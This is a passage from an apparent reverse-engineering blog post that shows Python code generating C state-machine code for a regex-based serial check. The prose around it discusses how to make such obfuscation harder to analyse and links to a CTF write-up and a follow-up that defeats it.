</span><span class='line'>
</span><span class='line'>    <span class="n">is_first</span> <span class="o">=</span> <span class="bp">True</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">transitions</span><span class="p">:</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">src</span> <span class="o">!=</span> <span class="n">i</span><span class="p">:</span>
</span><span class='line'>            <span class="k">continue</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="n">is_first</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;else&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>            <span class="n">is_first</span> <span class="o">=</span> <span class="bp">False</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">r</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\\</span><span class="s">&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;if(*p == </span><span class="si">%s</span><span class="s">)&quot;</span> <span class="o">%</span> <span class="nb">repr</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span><span class='line'>        <span class="k">elif</span> <span class="n">r</span> <span class="o">==</span> <span class="s">&#39;</span><span class="se">\\</span><span class="s">d&#39;</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;if(*p &gt;= &#39;0&#39; &amp;&amp; *p &lt;= &#39;9&#39;)&quot;</span>
</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;Not implemented!&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;{&#39;</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="n">fsm</span><span class="o">.</span><span class="n">finalStates</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;return 1;&#39;</span>
</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;state = </span><span class="si">%d</span><span class="s">; ++p;&#39;</span> <span class="o">%</span> <span class="n">dic_states</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;}&#39;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Kind of hack to not anchor the regex (not handled by the RE-&gt;FSM)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="n">fsm</span><span class="o">.</span><span class="n">initialState</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;else ++p;&#39;</span>
</span><span class='line'>    <span class="k">else</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;else return 0;&#39;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;break;</span><span class="se">\n</span><span class="s">}&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;}</span><span class="se">\n</span><span class="s">}</span><span class="se">\n</span><span class="s">return 0;</span><span class="se">\n</span><span class="s">}&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, if you open it in IDA the CFG will look like this:</p>

<p><img class="center" src="http://doar-e.github.io/images/regular_expressions_obfuscation_under_the_microscope/hell_yeah.png"></p>

<p>Not that fun to reverse-engineer I guess. If you are enough curious to look at the complete source, here it is: <a href="http://doar-e.github.io/downloads/code/regular_expressions_obfuscation_under_the_microscope/fsm_generated_by_hand_example.c">fsm_generated_by_hand_example.c</a>.</p>

<h2>Thoughts to be more evil: one input to bind all the regex in the darkness</h2>

<p>Keep in mind, the previous examples are really trivial to analyze, even if we had to do it at the assembly level without Hexrays (by the way Hexrays does a really nice job to simplify the assembly code, cool for us!). Even if we have slightly obfuscated the automaton with useless states/transitions, we may want to make things harder.</p>

<p>One interesting idea to bother the reverse-engineer is to use several regex as &ldquo;input filters&rdquo;. You create one first &ldquo;permissive&rdquo; regex that has many possible valid inputs. To reduce the valid inputs set you use another regex as a filter. And you do that until you have only one valid input: your serial. Note that you may also want to build complex regex, because you are evil.</p>

<p>In that case, the reverse-engineer <strong>has to</strong> analyze all the different regex. And if you focus on a specific regex, you will have too many valid inputs whereas only one gives you the good boy (the intersection of all the valid inputs set of the different regex).</p>

<p>If you are interested by the subject, a cool resource I&rsquo;ve seen recently that does similar things was in a CTF task write-up written by <a href="https://plus.google.com/111956453297829313313">Michal Kowalczyk</a>: read <a href="http://blog.dragonsector.pl/2013/07/sigint-ctf-2013-task-fenster-400-pts.html">it</a>, it&rsquo;s awesome.</p>

<p><strong>UPDATE</strong>: You should also read the follow-up made by <a href="https://twitter.com/fdfalcon">@fdfalcon</a> &ldquo;<a href="http://sysexit.wordpress.com/2013/09/04/a-black-box-approach-against-obfuscated-regular-expressions-using-pin/">A black-box approach against obfuscated regular expressions using Pin</a>&rdquo;. Using Pin to defeat the FSM obfuscation, and to prove my obfuscation was a bit buggy: two birds, one stone :)).</p>

<p>Messing with automata is good for you.</p>
]]></content>
    
  </entry>
  
</feed>